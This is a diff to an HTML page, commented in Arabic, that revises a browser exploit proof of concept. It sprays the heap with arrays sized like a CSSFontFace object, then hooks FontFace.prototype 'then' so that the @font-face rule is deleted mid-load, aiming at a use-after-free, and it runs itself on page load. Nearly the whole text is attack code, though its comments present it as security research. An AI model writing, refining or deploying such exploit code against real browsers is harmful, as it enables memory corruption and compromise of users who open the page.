@@ -2,45 +2,51 @@
 <html>
 <head>
     <style id="target-style">
-        /* قاعدة CSS ستتم إزالتها أثناء التحميل */
-        @font-face {
-            font-family: 'ExploitFont';
-            src: url('non-existent-font.woff2');
-        }
+        @font-face { font-family: 'ExploitFont'; src: url('trigger.woff2'); }
     </style>
 </head>
 <body>
     <script>
-// كود تجريبي لغرض البحث الأمني - Heap Grooming
-async function heapGrooming() {
-    const sprayCount = 1000;
-    let heapObjects = new Array(sprayCount);
+        // 1. إعداد منطقة الذاكرة (Heap Grooming)
+        const SPRAY_SIZE = 1000;
+        let heapSpray = new Array(SPRAY_SIZE);
 
-    // 1. ملء الذاكرة بـ ArrayBuffers لإنشاء ترتيب في الذاكرة
-    for (let i = 0; i < sprayCount; i++) {
-        heapObjects[i] = new Uint32Array(0x1000 / 4); 
-        // تخصيص مساحة مطابقة تقريباً لحجم كائن الـ FontFace
-    }
+        function prepareHeap() {
+            for (let i = 0; i < SPRAY_SIZE; i++) {
+                // نخصص مصفوفات بنفس حجم كائن CSSFontFace التقريبي
+                // لمحاولة تعبئة الثغرات التي يتركها الـ GC
+                heapSpray[i] = new Uint32Array(0x400); 
+            }
+        }
 
-    console.log("تم رش الذاكرة (Heap Spraying) بنجاح.");
-    return heapObjects;
-}
+        // 2. دالة تشغيل الثغرة (Triggering)
+        async function runExploit() {
+            prepareHeap();
 
-// دالة لدمج عملية الـ UAF مع الـ Grooming
-async function executeExploitStep() {
-    // 1. تحضير الذاكرة
-    const spray = await heapGrooming();
+            const font = new FontFace("ExploitFont", "url(exploit.woff2)");
+            document.fonts.add(font);
+            const loadPromise = font.load();
 
-    // 2. تفعيل الثغرة (كما في المثال السابق)
-    // عند تنفيذ deleteRule، سيصبح موقع كائن CSSFontFace متاحاً
-    // ومن المرجح أن يتم استبداله بأحد كائنات الـ ArrayBuffers التي أنشأناها
-    document.getElementById('s').sheet.deleteRule(0);
+            // اعتراض عملية الـ Promise لشن الهجوم في لحظة حرجة
+            Object.defineProperty(FontFace.prototype, 'then', {
+                get() {
+                    // هنا يتم حذف القاعدة أثناء التحميل
+                    document.getElementById('target-style').sheet.deleteRule(0);
+                    // Force Layout لتحفيز تغييرات الذاكرة
+                    document.body.offsetTop;
+                    return undefined;
+                }
+            });
 
-    // 3. التحقق (Verification)
-    // محاولة الوصول للكائن المحرر عبر الكائن الجديد (ArrayBuffer)
-    console.log("محاولة التحكم في الكائن المحرر...");
-}
+            try {
+                await loadPromise;
+            } catch (e) {
+                console.log("تم رصد محاولة التلاعب بالذاكرة.");
+            }
+        }
 
+        // تشغيل العملية
+        window.onload = runExploit;
     </script>
 </body>
 </html>
